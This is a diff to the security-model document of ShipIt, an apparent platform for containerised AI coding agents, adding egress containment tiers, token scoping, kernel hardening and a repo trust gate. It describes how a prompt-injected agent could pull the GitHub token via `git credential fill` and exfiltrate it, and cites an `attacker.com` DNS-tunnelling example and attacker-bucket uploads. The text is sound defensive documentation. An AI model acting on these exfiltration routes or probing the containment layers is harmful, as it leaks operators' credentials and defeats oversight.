@@ -82,7 +82,15 @@ are brokered to the container on demand — they are not handed to the agent's s
   unreachable: the helper serves whatever process asks it, so a prompt-injected agent can
   invoke it (e.g. `git credential fill`) to obtain the PAT on demand and, with egress open,
   exfiltrate it. Brokering raises the bar from a one-line read to an active request; the
-  egress allow-list (see Known limitations) is what would actually contain that.
+  egress allow-list (see Network egress containment) is what would actually contain that.
+- **Short-lived, repo-scoped GitHub App tokens (defense-in-depth, SHI-79).** When an
+  operator configures a GitHub App (`GITHUB_APP_ID` + `GITHUB_APP_PRIVATE_KEY`), the broker
+  prefers a **single-repo-scoped installation token** (`contents:write`,
+  `pull_requests:write`, `metadata:read`; minted via an RS256 JWT, cached with a refresh
+  margin) over the long-lived PAT (`github-app-token.ts`, `getRepoScopedGitCredential`). So
+  even an extracted token is scoped to one repo with a short TTL rather than being the full
+  account PAT. It ships dark — without an App configured the broker falls back to the PAT —
+  and removing the PAT path entirely waits on the App becoming mandatory.
 - **Per-session, per-agent credential copies.** Each session gets its own `/credentials`
   subpath rather than a shared mount, and only the *pinned* agent's files are copied in — a
   Claude session never sees `.codex`, and vice versa. Because warm-pool containers boot
@@ -143,6 +151,22 @@ be hostile.
   defense-in-depth that shrinks in-container blast radius; it does **not** replace
   credential brokering or egress control (the agent's own credentials are still reachable
   by the uid-1000 agent — see Known limitations). See `docs/150-non-root-session-worker/`.
+- **Optional kernel-tier hardening, default-OFF.** Three further controls
+  (`container-hardening.ts`, SHI-97, `docs/172` Gap 5) can be switched on per deployment:
+  a **read-only root filesystem** (`SESSION_READONLY_ROOTFS=1` → `ReadonlyRootfs: true`
+  with `exec` tmpfs for `/tmp`, `/run`, `/home/shipit`; the persistent mounts stay
+  writable and credential symlinks are rehydrated under the tmpfs HOME), a **tightened
+  seccomp profile** (`SESSION_SECCOMP=1` → `docker/seccomp/session-worker.json`, a
+  default-deny allowlist that additionally blocks `ptrace`, `process_vm_*`, `bpf`,
+  `perf_event_open`, `userfaultfd`, …; fail-closed on an unreadable profile), and the
+  **gVisor (`runsc`) runtime** (`SESSION_RUNTIME=runsc`) on hosts that register it. All
+  three ship OFF — unset means Docker's stock `runc`/seccomp/writable-rootfs, byte-for-byte
+  unchanged — and each has been verified on a live host. They are defense-in-depth; the
+  always-on baseline is the non-root worker + dropped capabilities above.
+- **Read-only mounts where the agent has no write need.** `/uploads` is mounted `:ro`
+  (`buildMounts`): uploads are written orchestrator-side on the host, so a prompt-injected
+  agent can read but not tamper with or delete them (SHI-45). `/credentials` stays writable
+  only because the agent CLI refreshes its OAuth token in place (blocked on SHI-164).
 - **Orchestrator ↔ container is HTTP-only.** The orchestrator never uses `docker exec`. It
   talks to a Fastify worker inside each container over HTTP, and events stream back over
   SSE. The control channel is a well-defined API surface, not arbitrary command execution.
@@ -162,6 +186,54 @@ be hostile.
   the target container IP from **server-side session state** (not user input), and rewrites
   the `Host` header to the container's local dev server — closing off DNS-rebinding and
   SSRF-to-arbitrary-host vectors.
+
+## Network egress containment
+
+Full outbound internet access from the agent container was historically ShipIt's biggest
+accepted risk: any credential reachable inside the box could be exfiltrated by a
+prompt-injected agent. ShipIt now ships a **default-deny egress gateway** that closes that
+hole at the network layer (SHI-90, `docs/172-agent-containment/egress-control.md`). It is
+enforcement *inside the agent's own network namespace* by short-lived, orchestrator-launched
+privileged sidecars (`--network container:<agent>`, `NET_ADMIN`) — not an `HTTP_PROXY` env
+var (which a raw socket trivially bypasses) — so even a raw socket cannot escape it. Three
+tiers compose:
+
+- **Tier A — iptables default-deny.** A sidecar installs `OUTPUT DROP` plus an `ipset`
+  allow-set (resolved allowlist FQDNs + GitHub's `gh api meta` CIDRs, resolve-before-deny)
+  in the agent netns, with an `example.com`-must-fail self-test (fail-closed). A socket to a
+  non-allowlisted host simply times out.
+- **Tier B — controlled DNS resolver.** A dnsmasq sidecar forwards *only* allowlisted
+  domains (so `dig secret.attacker.com` is refused — DNS tunnelling is closed) and pins each
+  resolved IP into the Tier A ipset (no stale-IP breakage). The agent's DNS is iptables-
+  REDIRECTed into it.
+- **Tier C — transparent SNI proxy.** A dependency-free Go sidecar peeks the ClientHello SNI
+  (no TLS decryption, no CA injection — end-to-end TLS is preserved) and splices-or-rejects
+  per hostname, closing the CDN co-tenancy gap (an allowlisted and a non-allowlisted host
+  sharing one CDN IP are indistinguishable to the ipset but differ by SNI). A **Phase-2
+  identity-validating** mode scopes multi-tenant hosts (e.g. only `my-bucket.s3.amazonaws.com`,
+  rejecting `attacker.s3.amazonaws.com` and the path-style apex on the same IP) so an
+  approved API can't be used to upload into an attacker's account.
+
+- **Operator opt-in, fail-secure once on.** The whole subsystem is gated on
+  `SESSION_EGRESS_ENFORCE=1` (+ `SESSION_EGRESS_SIDECAR_IMAGE`, now auto-built by
+  `dev.sh`/`deploy.sh`), with Tiers B and C behind their own `SESSION_EGRESS_DNS` /
+  `SESSION_EGRESS_PROXY` flags; **default OFF**. When enabled, containment is fail-secure: a
+  missing global setting resolves to **Contained**, and the per-session resolution
+  (`resolveContained`) defaults to Contained too. A Settings → **Network** tab exposes a
+  global containment toggle, a per-session Inherit/Contained/Open override, and a
+  first-class allowlist editor showing the **effective** allowlist with provenance (built-in
+  / operator / MCP / user-added). Built-in defaults are overridable with a "Restore
+  defaults" action. When the proxy denies a brand-new host it surfaces a persisted
+  **allow-once / add-to-allowlist** card in chat; approving it live-reloads the running
+  session's resolver and proxy **without a container restart**.
+- **MCP hosts and operator extras can't drift.** One composition seam merges
+  `SESSION_EGRESS_ALLOWLIST` + live MCP-server hosts + the durable user allowlist and feeds
+  *both* the Tier B resolver's pinned set and the Tier C proxy's SNI allowlist at container
+  start, so the two enforcement points always agree.
+
+All three tiers and the Phase-2 identity proxy have been verified non-vacuously on a live
+host. The residual is **activation, not absence** — see Known limitations: until an operator
+flips the flags on, egress is still open and the credential-exfiltration risk stands.
 
 ## Untrusted input — content is data, not instructions
 
@@ -187,10 +259,17 @@ input surface.
   instructions should be surfaced to the user rather than obeyed. This covers the surfaces
   ShipIt does not broker (the agent's own `WebFetch`/MCP calls return straight to the CLI),
   so the lens applies even without a wrapper.
+- **A trust gate before untrusted-repo code runs (docs/178).** Cloning a repo is one
+  thing; *executing* its setup is another. On the first open of an untrusted remote, ShipIt
+  defers `agent.install` and any Compose `command:` / `build:` until the user accepts via a
+  `RepoTrustBanner` (`POST /api/repos/trust`); the decision persists per remote in
+  `RepoStore` and the warm-pool pre-install is gated on it. ShipIt-created template repos are
+  trusted by construction. This stops a malicious `shipit.yaml`/`docker-compose.yml` from
+  auto-running on clone.
 - **Defense-in-depth, not the barrier.** Per this model, no model-layer framing reaches
   100%. The lens raises the bar and gives the model a clear signal; the load-bearing
-  defenses against exfiltration remain environment-layer (egress control and credential
-  isolation — see Known limitations). ShipIt deliberately *delimits and frames* rather than
+  defenses against exfiltration remain environment-layer (egress containment and credential
+  isolation). ShipIt deliberately *delimits and frames* rather than
   filtering "injection phrases," which is brittle and breeds false confidence.
 
 ## Cross-session isolation
@@ -204,6 +283,14 @@ Sessions are independent all the way down:
   chat history, and per-session in-memory runner state (message queue, terminal buffer,
   event stream). There is no shared mutable session state that one session can use to
   observe another.
+- **Capability-scoped sandbox sessions (docs/211).** A *sandbox* session is a bare container
+  with an empty `/workspace` and an explicit, immutable per-session set of granted
+  capabilities (`SessionCapabilities`): `git` (the GitHub credential broker), `docker`
+  (session-scoped Docker — its own containers/networks/volumes, never the host socket), and
+  `network` (how contained egress is — `true` = the standard allowlist, `false` =
+  lifeline-only; it only ever tightens). The defaults are least-privilege —
+  `{ git: false, docker: false, network: true }` — and untrusted creation payloads are
+  coerced against them (`normalizeCapabilities`), so a missing flag never reads as a grant.
 
 ## Network exposure and access control
 
@@ -225,19 +312,17 @@ but it means **you must not expose a raw ShipIt instance to the public internet.
 Honesty is part of the security model. These are the gaps ShipIt is aware of, the reasoning
 for accepting them today, and where they're headed.
 
-- **Unrestricted agent network egress (the big one).** Agent containers still have full
-  outbound internet access. Any credential reachable inside the container — the agent CLI's own
-  OAuth/subscription token, MCP server tokens, any secret you explicitly marked as reachable by
-  the agent, and the GitHub PAT the credential helper will hand out on request — can therefore
-  be **exfiltrated by a prompt-injected agent** (e.g. `curl`-ing it to an attacker). Brokering
-  keeps the PAT off disk so it's no longer a trivial read, but it doesn't stop a determined
-  agent from requesting it through the helper; egress control, not brokering, is what ultimately
-  contains that. The mitigation is **in design** (SHI-90, `docs/172-agent-containment/egress-control.md`):
-  a default-deny **gateway middlebox** — the container on an `internal` network whose only route
-  out is an orchestrator-controlled gateway running iptables + a controlled DNS resolver + a
-  transparent allowlisting proxy, so even a raw socket cannot bypass it (an `HTTP_PROXY` env var
-  alone can, which is why that approach was rejected). An **identity-validating proxy** for
-  multi-tenant allowlisted hosts is a Phase-2 follow-up. Until the gateway ships: treat anything
+- **Agent network egress is open unless the operator turns containment on (the big one).**
+  The default-deny egress gateway is now **built and live-verified** (all three tiers + the
+  Phase-2 identity proxy — see "Network egress containment"), but it ships **default-OFF**:
+  it activates only when an operator sets `SESSION_EGRESS_ENFORCE=1` (+ the sidecar image and,
+  for Tiers B/C, `SESSION_EGRESS_DNS` / `SESSION_EGRESS_PROXY`). Until then, agent containers
+  have full outbound internet access, and any credential reachable inside the container — the
+  agent CLI's own OAuth/subscription token, MCP server tokens, any secret you marked reachable
+  by the agent, and the GitHub PAT the credential helper hands out on request — can be
+  **exfiltrated by a prompt-injected agent**. So the residual risk is now **activation, not
+  absence of a mechanism**: the gap is shrinking the operator-opt-in step (and eventually
+  flipping the default). Until you enable containment on your instance, treat anything
   reachable inside the container as reachable by a compromised agent.
 - **Bind-mount validation has a TOCTOU window.** The Docker proxy validates that a
   child-container bind mount resolves under the session's workspace, but a time-of-check /
@@ -245,13 +330,14 @@ for accepting them today, and where they're headed.
   attacker, a pre-planted symlink, and precise timing; the workspace-path scoping and the
   dropped capabilities limit the blast radius. A `nosymfollow` / inode-based check is the
   intended hardening.
-- **Container root filesystem is still writable.** The session worker now runs
-  unprivileged (uid 1000 — see "Agent and container containment"), which closes the old
-  "worker runs as root" gap, but the container's *root filesystem* is not yet mounted
-  read-only. A `ReadonlyRootfs` + seccomp pass (SHI-97) is the planned next step; the exact
-  inventory of paths the non-root worker must still write to is already enumerated in
-  `docs/150-non-root-session-worker/` so that work can flip the rootfs without a
-  write-permission scavenger hunt.
+- **Kernel-tier hardening ships default-OFF.** A read-only root filesystem, the tightened
+  seccomp profile, and the gVisor runtime are all **built and live-verified** (SHI-97 — see
+  "Optional kernel-tier hardening" above), but like egress they're env-gated and **off by
+  default**: an unconfigured instance still runs a writable rootfs and Docker's stock seccomp
+  under `runc`. The always-on baseline remains the non-root worker + dropped capabilities;
+  the residual here is again activation, plus the operator cost (gVisor in particular has a
+  real workload cost, which is why it's opt-in). Flip `SESSION_READONLY_ROOTFS=1` /
+  `SESSION_SECCOMP=1` / `SESSION_RUNTIME=runsc` to raise the floor.
 - **The agent's own CLI credentials are present in its container.** The pinned agent's CLI
   needs its OAuth/subscription token to authenticate, so that token is present on disk inside
   the session (in the per-session credential copy described above). A prompt-injected agent
@@ -261,7 +347,8 @@ for accepting them today, and where they're headed.
   mount wouldn't help, since it blocks writes, not reads. The exposure is bounded — a session
   holds only its *own* pinned agent's token, and the orchestrator (not the container) remains
   the source of truth for it — but the live token is still reachable in-container while the
-  agent runs, and the egress allow-list above is the containment that would close it.
+  agent runs, and egress containment (when the operator enables it) is what closes the
+  exfiltration path.
 - **No orchestrator-level user auth.** As above, this is by design for single-tenant use
   and is covered by the deployment access layer — but it does mean an unprotected exposed
   instance is fully open. Don't run one. (This is about the *browser* caller. The separate
